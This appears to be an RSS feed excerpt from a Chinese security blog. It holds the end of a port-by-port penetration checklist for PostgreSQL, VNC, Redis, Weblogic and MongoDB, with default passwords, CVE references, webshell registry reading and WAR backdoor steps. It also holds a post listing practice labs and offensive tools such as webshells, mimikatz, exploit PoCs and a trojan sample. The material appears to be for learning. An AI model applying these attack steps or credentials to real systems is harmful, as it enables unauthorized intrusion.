&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;（1）radmini同样存在不少弱口令的主机，通过专用扫描器可探测到此类存在漏洞的主机。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（2）radmini远控的连接密码和端口都是写入到注册表系统中的，通过使用webshell注册表读取功能可读取radmini在注册表的各项键值内容，从而破解加密的密码散列。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h5 id=&#34;5432端口渗透剖析postgresql&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5432端口渗透剖析postgresql&#34;&gt;#&lt;/a&gt;  &lt;code&gt;5432端口渗透剖析&lt;/code&gt;  (PostgreSQL)&lt;/h5&gt;
&lt;p&gt;PostgreSQL 是一种特性非常齐全的自由软件的对象–关系型数据库管理系统，可以说是目前世界上最先进，功能最强大的自由数据库管理系统。包括 kali 系统中 msf 也使用这个数据库；浅谈 postgresql 数据库攻击技术 大部分关于它的攻击依旧是 sql 注入，所以注入才是数据库不变的话题。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;（1）爆破：弱口令：postgres postgres&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（2）缓冲区溢出：CVE-2014-2669。（http://drops.xmd5.com/static/drops/tips-6449.html）（3）远程代码执行：CVE-2018-1058。（https://www.secpulse.com/archives/69153.html）&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h5 id=&#34;5900端口渗透剖析vnc&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5900端口渗透剖析vnc&#34;&gt;#&lt;/a&gt;  &lt;code&gt;5900端口渗透剖析&lt;/code&gt;  (VNC)&lt;/h5&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;（1）VNC软件存在密码验证绕过漏洞，此高危漏洞可以使得恶意攻击者不需要密码就可以登录到一个远程系统。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（2）cain同样支持对VNC的嗅探，同时支持端口修改。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（3）VNC的配置信息同样被写入注册表系统中，其中包括连接的密码和端口。利用webshell的注册表读取功能进行读取加密算法，然后破解。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（4）VNC拒绝服务攻击（CVE-2015-5239）。（http://blogs.360.cn/post/vnc%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9Ecve-2015-5239%E5%88%86%E6%9E%90.html）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（5）VNC权限提升（CVE-2013-6886）。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h5 id=&#34;6379端口渗透剖析redis&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#6379端口渗透剖析redis&#34;&gt;#&lt;/a&gt;  &lt;code&gt;6379端口渗透剖析&lt;/code&gt;  (Redis)&lt;/h5&gt;
&lt;p&gt;Redis 是一个开源的使用 c 语言写的，支持网络、可基于内存亦可持久化的日志型、key-value 数据库。关于这个数据库这两年还是很火的，暴露出来的问题也很多。特别是前段时间暴露的未授权访问。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;（1）爆破：弱口令&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（2）未授权访问+配合ssh key提权。（http://www.alloyteam.com/2017/07/12910/）&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h5 id=&#34;70017002端口渗透剖析weblogic&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#70017002端口渗透剖析weblogic&#34;&gt;#&lt;/a&gt;  &lt;code&gt;7001/7002端口渗透剖析&lt;/code&gt;  (Weblogic)&lt;/h5&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;（1）弱口令、爆破，弱密码一般为weblogic/Oracle@123 or weblogic&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（2）管理后台部署 war 后门&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（3）SSRF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（4）反序列化漏洞&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（5）weblogic_uac&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf)(https://bbs.pediy.com/thread-224954.htm)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(https://fuping.site/2017/06/05/Weblogic-Vulnerability-Verification/)(https://blog.gdssecurity.com/labs/2015/3/30/weblogic-ssrf-and-xss-cve-2014-4241-cve-2014-4210-cve-2014-4.html)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h5 id=&#34;27017端口渗透剖析mongodbnosql数据库&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#27017端口渗透剖析mongodbnosql数据库&#34;&gt;#&lt;/a&gt;  &lt;code&gt;27017端口渗透剖析&lt;/code&gt;  (MongoDB,NoSQL 数据库)&lt;/h5&gt;
&lt;p&gt;MongoDB，NoSQL 数据库；攻击方法与其他数据库类似&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;（1）爆破：弱口令&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（2）未授权访问；（http://www.cnblogs.com/LittleHann/p/6252421.html）（http://www.tiejiang.org/19157.html)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://chungod.github.io/2021/11/11/%E6%BC%8F%E6%B4%9E%E5%8F%8A%E6%B8%97%E9%80%8F%E8%81%94%E7%B3%BB%E5%B9%B3%E5%8F%B0/</guid>
            <title></title>
            <link>https://chungod.github.io/2021/11/11/%E6%BC%8F%E6%B4%9E%E5%8F%8A%E6%B8%97%E9%80%8F%E8%81%94%E7%B3%BB%E5%B9%B3%E5%8F%B0/</link>
            <pubDate>Thu, 11 Nov 2021 17:07:43 +0800</pubDate>
            <description><![CDATA[ &lt;h4 id=&#34;漏洞及渗透练习平台&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞及渗透练习平台&#34;&gt;#&lt;/a&gt; 漏洞及渗透练习平台&lt;/h4&gt;
&lt;p&gt;漏洞及渗透练习平台：&lt;br&gt;
ZVulDrill&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tLzcxMGxlby9aVnVsRHJpbGw=&#34;&gt;https://github.com/710leo/ZVulDrill&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;SecGen Ruby 编写的一款工具，生成含漏洞的虚拟机&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2NsaWZmZS9zZWNnZW4=&#34;&gt; https://github.com/cliffe/secgen&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;btslab 渗透测试实验室&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0NTUEYtRm91bmRlci9idHNsYWI=&#34;&gt; https://github.com/CSPF-Founder/btslab&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;WebGoat 漏洞练习环境&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1dlYkdvYXQvV2ViR29hdA==&#34;&gt; https://github.com/WebGoat/WebGoat&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1dlYkdvYXQvV2ViR29hdC1MZWdhY3k=&#34;&gt;https://github.com/WebGoat/WebGoat-Legacy&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Damn Vulnerable Web Application (漏洞练习平台)&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1JhbmRvbVN0b3JtL0RWV0E=&#34;&gt;https://github.com/RandomStorm/DVWA&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;轻量 web 漏洞演示平台&lt;br&gt;
 stamparm/DSVW&lt;/p&gt;
&lt;p&gt;黑客技术训练环境&lt;br&gt;
 joe-shenouda/awesome-cyber-skills&lt;/p&gt;
&lt;p&gt;web 及 app 渗透训练平台&lt;br&gt;
 OWASP/SecurityShepherd&lt;/p&gt;
&lt;p&gt;docker 搭建的漏洞练习环境&lt;br&gt;
 MyKings/docker-vulnerability-environment&lt;/p&gt;
&lt;p&gt;数据库注入练习平台&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0F1ZGktMS9zcWxpLWxhYnM=&#34;&gt; https://github.com/Audi-1/sqli-labs&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;用 node 编写的漏洞练习平台，like OWASP Node Goat&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2NyMGhuL3Z1bG5lcmFibGUtbm9kZQ==&#34;&gt;https://github.com/cr0hn/vulnerable-node&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;社工插件，可查找以 email、phone、username 的注册的所有网站账号信息&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL24wdHIwMHQvU3JlZw==&#34;&gt;https://github.com/n0tr00t/Sreg&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Github 信息搜集，可实时扫描查询 Git 最新上传有关邮箱账号密码信息&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3NlYS1nb2QvZ2l0c2Nhbg==&#34;&gt;https://github.com/sea-god/gitscan&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&#34;github-repo信息搜集工具&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#github-repo信息搜集工具&#34;&gt;#&lt;/a&gt; github Repo 信息搜集工具&lt;/h4&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL21ldGFjMHJ0ZXgvR2l0SGFydmVzdGVy&#34;&gt;https://github.com/metac0rtex/GitHarvester&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;webshell 大合集&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3Rlbm5jL3dlYnNoZWxs&#34;&gt;https://github.com/tennc/webshell&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;渗透以及 web 攻击脚本&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2JyaWFud3JmL2hhY2tVdGlscw==&#34;&gt;https://github.com/brianwrf/hackUtils&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;web 渗透小工具大合集&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3Jvb3RwaGFudG9tZXIvaGFja190b29sc19mb3JfbWU=&#34;&gt;https://github.com/rootphantomer/hack_tools_for_me&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;XSS 数据接收平台&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2ZpcmVzdW5DTi9CbHVlTG90dXNfWFNTUmVjZWl2ZXI=&#34;&gt;https://github.com/firesunCN/BlueLotus_XSSReceiver&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;XSS 与 CSRF 工具&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2V2aWxjb3MveHNzb3I=&#34;&gt;https://github.com/evilcos/xssor&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Short for command injection exploiter，web 向命令注入检测工具&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3N0YXNpbm9wb3Vsb3MvY29tbWl4&#34;&gt;https://github.com/stasinopoulos/commix&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;数据库注入工具&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3NxbG1hcHByb2plY3Qvc3FsbWFw&#34;&gt;https://github.com/sqlmapproject/sqlmap&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Web 代理，通过加载 sqlmap api 进行 sqli 实时检测&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3p0Mi9zcWxpLWh1bnRlcg==&#34;&gt;https://github.com/zt2/sqli-hunter&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;新版中国菜刀&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0Nob3JhMTAvQ2tuaWZl&#34;&gt;https://github.com/Chora10/Cknife&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;.git 泄露利用 EXP&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2xpamllamllL0dpdEhhY2s=&#34;&gt;https://github.com/lijiejie/GitHack&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;浏览器攻击框架&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2JlZWZwcm9qZWN0L2JlZWY=&#34;&gt;https://github.com/beefproject/beef&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;自动化绕过 WAF 脚本&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2toYWxpbGJpampvdS9XQUZOaW5qYQ==&#34;&gt;https://github.com/khalilbijjou/WAFNinja&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;http 命令行客户端，可以从命令行构造发送各种 http 请求（类似于 Curl）&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2prYnJ6dC9odHRwaWU=&#34;&gt;https://github.com/jkbrzt/httpie&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;浏览器调试利器&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2ZpcmVidWcvZmlyZWJ1Zw==&#34;&gt;https://github.com/firebug/firebug&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;一款开源 WAF&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1NwaWRlckxhYnMvTW9kU2VjdXJpdHk=&#34;&gt;https://github.com/SpiderLabs/ModSecurity&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;WAF 绕过检测工具&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL293dGYvd2FmYnlwYXNzZXI=&#34;&gt;https://github.com/owtf/wafbypasser&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;浏览器攻击框架&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2p1bGllbmJlZGFyZC9icm93c2Vyc3Bsb2l0&#34;&gt;https://github.com/julienbedard/browsersploit&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;web 端 webshell 管理器&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2d1aWxsb3RpbmVzL1dlYlNoZWxs&#34;&gt; https://github.com/guillotines/WebShell&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;tomcat 自动后门部署&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL21nZWVreS90b21jYXRXYXJEZXBsb3llcg==&#34;&gt; https://github.com/mgeeky/tomcatWarDeployer&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&#34;windows渗透神器&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#windows渗透神器&#34;&gt;#&lt;/a&gt; windows 渗透神器&lt;/h4&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2dlbnRpbGtpd2kvbWltaWthdHo=&#34;&gt;https://github.com/gentilkiwi/mimikatz&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Powershell 渗透库合集&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1Bvd2VyU2hlbGxNYWZpYS9Qb3dlclNwbG9pdA==&#34;&gt;https://github.com/PowerShellMafia/PowerSploit&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Powershell tools 合集&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2NseW1iM3IvUG93ZXJTaGVsbA==&#34;&gt;https://github.com/clymb3r/PowerShell&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;windows 漏洞利用相关整理&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2VuZGRvL2F3ZXNvbWUtd2luZG93cy1leHBsb2l0YXRpb24=&#34;&gt;https://github.com/enddo/awesome-windows-exploitation&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;从内存中提取敏感信息的工具&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3B1dHRlcnBhbmRhL21pbWlraXR0ZW56&#34;&gt;https://github.com/putterpanda/mimikittenz&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&#34;fireeye红军渗透工具&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#fireeye红军渗透工具&#34;&gt;#&lt;/a&gt; fireeye 红军渗透工具&lt;/h4&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2NoYW5nbzc3NzQ3L0FkRW51bWVyYXRvcg==&#34;&gt;https://github.com/chango77747/AdEnumerator&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1JhaWtpYS9DcmVkTmluamE=&#34;&gt;https://github.com/Raikia/CredNinja&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0NocmlzVHJ1bmNlci9XTUlPcHM=&#34;&gt;https://github.com/ChrisTruncer/WMIOps&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0NocmlzVHJ1bmNlci9FeWVXaXRuZXNz&#34;&gt;https://github.com/ChrisTruncer/EyeWitness&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0NocmlzVHJ1bmNlci9FZ3Jlc3MtQXNzZXNz&#34;&gt;https://github.com/ChrisTruncer/Egress-Assess&lt;/span&gt;&lt;br&gt;
Web 向 Fuzz 工具&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3htZW5kZXovd2Z1eno=&#34;&gt;https://github.com/xmendez/wfuzz&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;HTTP 暴力破解，撞库攻击脚本&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2xpamllamllL2h0cHdkU2Nhbg==&#34;&gt;https://github.com/lijiejie/htpwdScan&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;msf&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3JhcGlkNy9tZXRhc3Bsb2l0LWZyYW1ld29yaw==&#34;&gt;https://github.com/rapid7/metasploit-framework&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Poc 调用框架，可加载 Pocsuite,Tangscan，Beebeeto 等&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2VyZXZ1cy1jbi9wb2NzY2Fu&#34;&gt;https://github.com/erevus-cn/pocscan&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Pocsuite&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2tub3duc2VjL1BvY3N1aXRl&#34;&gt;https://github.com/knownsec/Pocsuite&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Beebeeto&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL24wdHIwMHQvQmVlYmVldG8tZnJhbWV3b3Jr&#34;&gt;https://github.com/n0tr00t/Beebeeto-framework&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;ExploitDB 官方 git 版本&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL29mZmVuc2l2ZS1zZWN1cml0eS9leHBsb2l0LWRhdGFiYXNl&#34;&gt;https://github.com/offensive-security/exploit-database&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;PHP 漏洞代码分析&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tLzgwdnVsL3BocGNvZHo=&#34;&gt;https://github.com/80vul/phpcodz&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Simple test for CVE-2016-2107&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0ZpbG9Tb3R0aWxlL0NWRS0yMDE2LTIxMDc=&#34;&gt;https://github.com/FiloSottile/CVE-2016-2107&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;CVE-2015-7547 POC&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2Zqc2VybmEvQ1ZFLTIwMTUtNzU0Nw==&#34;&gt;https://github.com/fjserna/CVE-2015-7547&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Java 反序列化 POC 生成工具&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2Zyb2hvZmYveXNvc2VyaWFs&#34;&gt;https://github.com/frohoff/ysoserial&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;JAVA 反序列化 EXP&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2ZveGdsb3Zlc2VjL0phdmFVbnNlcmlhbGl6ZUV4cGxvaXRz&#34;&gt;https://github.com/foxglovesec/JavaUnserializeExploits&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Jenkins CommonCollections EXP&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0NhbGVkb25pYVByb2plY3QvamVua2lucy1jbGktZXhwbG9pdA==&#34;&gt;https://github.com/CaledoniaProject/jenkins-cli-exploit&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;CVE-2015-2426 EXP (windows 内核提权)&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3ZsYWQ5MDIvaGFja2luZy10ZWFtLXdpbmRvd3Mta2VybmVsLWxwZQ==&#34;&gt;https://github.com/vlad902/hacking-team-windows-kernel-lpe&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;use Docker to show web attack (php 本地文件包含结合 phpinfo getshell 以及 ssrf 结合 curl 的利用演示)&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2h4ZXIvdnVsbmFwcA==&#34;&gt;https://github.com/hxer/vulnapp&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;php7 缓存覆写漏洞 Demo 及相关工具&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0dvU2VjdXJlL3BocDctb3BjYWNoZS1vdmVycmlkZQ==&#34;&gt;https://github.com/GoSecure/php7-opcache-override&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;XcodeGhost 木马样本&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1hjb2RlR2hvc3RTb3VyY2UvWGNvZGVHaG9zdA==&#34;&gt;https://github.com/XcodeGhostSource/XcodeGhost&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;哈希长度扩展攻击 EXP&lt;/p&gt;
